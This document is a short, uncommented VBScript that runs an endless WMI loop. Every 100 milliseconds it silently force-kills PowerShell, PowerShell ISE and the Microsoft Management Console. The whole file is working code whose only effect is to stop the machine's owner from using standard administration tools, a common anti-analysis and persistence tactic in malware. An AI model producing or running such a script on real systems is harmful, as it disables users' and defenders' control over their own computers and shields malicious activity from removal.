Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
processesToCheck = Array("powershell.exe", "powershell_ise.exe", "mmc.exe")

Do
    For Each processName In processesToCheck
        Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process Where Name = '" & processName & "'")
        For Each objProcess In colProcessList
            Dim objShell
            Set objShell = CreateObject("WScript.Shell")
            objShell.Run "cmd.exe /c taskkill /F /T /IM " & processName, 0, True
            Set objShell = Nothing
        Next
    Next
    WScript.Sleep 100
Loop